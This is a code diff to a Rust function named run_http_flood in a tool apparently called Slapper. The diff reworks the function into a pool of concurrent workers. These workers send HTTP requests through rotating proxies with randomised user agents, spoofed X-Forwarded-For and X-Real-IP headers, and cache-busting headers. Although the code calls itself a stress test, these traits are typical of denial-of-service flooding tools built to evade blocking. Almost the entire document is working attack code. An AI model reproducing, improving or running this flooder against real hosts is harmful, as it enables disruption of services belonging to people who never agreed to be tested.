@@ -1,10 +1,10 @@
 use crate::error::{Result, SlapperError};
 use crate::utils::create_insecure_http_client;
-use futures::future::join_all;
 use indicatif::{ProgressBar, ProgressStyle};
 use rand::Rng;
+use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::Arc;
-use std::time::{Duration, Instant};
+use std::time::Duration;
 
 use super::metrics::StressMetrics;
 use super::{StressConfig, StressStats};
@@ -38,7 +38,7 @@ pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> R
     let total_requests = config.rate_pps * config.duration_secs;
     let mut proxy_index = 0usize;
 
-    let progress = Arc::new(ProgressBar::new(config.duration_secs));
+    let progress = Arc::new(ProgressBar::new(total_requests));
     progress.set_style(
         ProgressStyle::default_bar()
             .template(
@@ -48,73 +48,76 @@ pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> R
             .progress_chars("=>-"),
     );
 
-    let semaphore = Arc::new(tokio::sync::Semaphore::new(config.concurrency));
     let metrics = Arc::new(metrics.clone());
-    let _start_time = Instant::now();
 
     metrics.start();
+    let request_idx = Arc::new(AtomicU64::new(0));
+    let worker_count = config.concurrency.max(1).min(total_requests.max(1) as usize);
+    let mut handles = Vec::with_capacity(worker_count);
 
-    let mut handles = Vec::with_capacity(total_requests as usize);
-    let _requests_per_second = config.rate_pps;
-
-    for _ in 0..total_requests {
-        let permit = semaphore
-            .clone()
-            .acquire_owned()
-            .await
-            .map_err(|e| SlapperError::Runtime(e.to_string()))?;
+    for worker_id in 0..worker_count {
         let client = if clients.is_empty() {
             None
         } else {
-            proxy_index = proxy_index % clients.len();
-            let client = clients[proxy_index].clone();
+            proxy_index %= clients.len();
+            let client = clients[(proxy_index + worker_id) % clients.len()].clone();
             proxy_index += 1;
             Some(client)
         };
         let url = target_url.clone();
         let metrics = metrics.clone();
-        let _progress = progress.clone();
+        let request_idx = request_idx.clone();
+        let progress = progress.clone();
 
         let handle = tokio::spawn(async move {
-            let _request_start = Instant::now();
-
-            let result: std::result::Result<
-                reqwest::Response,
-                Box<dyn std::error::Error + Send + Sync>,
-            > = if let Some(client) = client {
-                client
-                    .get(&url)
-                    .header("User-Agent", random_user_agent())
-                    .header("Accept", "*/*")
-                    .header("Accept-Language", "en-US,en;q=0.9")
-                    .header("Cache-Control", "no-cache")
-                    .header("Pragma", "no-cache")
-                    .header("X-Forwarded-For", random_ip())
-                    .header("X-Real-IP", random_ip())
-                    .send()
-                    .await
-                    .map_err(|e| e.into())
-            } else {
-                Err("no proxy available".into())
-            };
-
-            match result {
-                Ok(response) => {
-                    let size = response.content_length().unwrap_or(0);
-                    metrics.record_packet(size);
+            loop {
+                let current = request_idx.fetch_add(1, Ordering::Relaxed);
+                if current >= total_requests {
+                    break;
                 }
-                Err(_) => {
-                    metrics.record_error();
+
+                let result: std::result::Result<
+                    reqwest::Response,
+                    Box<dyn std::error::Error + Send + Sync>,
+                > = if let Some(client) = &client {
+                    client
+                        .get(&url)
+                        .header("User-Agent", random_user_agent())
+                        .header("Accept", "*/*")
+                        .header("Accept-Language", "en-US,en;q=0.9")
+                        .header("Cache-Control", "no-cache")
+                        .header("Pragma", "no-cache")
+                        .header("X-Forwarded-For", random_ip())
+                        .header("X-Real-IP", random_ip())
+                        .send()
+                        .await
+                        .map_err(|e| e.into())
+                } else {
+                    Err("no proxy available".into())
+                };
+
+                match result {
+                    Ok(response) => {
+                        let size = response.content_length().unwrap_or(0);
+                        metrics.record_packet(size);
+                    }
+                    Err(_) => {
+                        metrics.record_error();
+                    }
                 }
+
+                progress.inc(1);
             }
-
-            drop(permit);
         });
 
         handles.push(handle);
     }
 
-    join_all(handles).await;
+    for handle in handles {
+        handle
+            .await
+            .map_err(|e| SlapperError::Runtime(format!("HTTP stress task join failed: {e}")))?;
+    }
 
     progress.finish_and_clear();
 
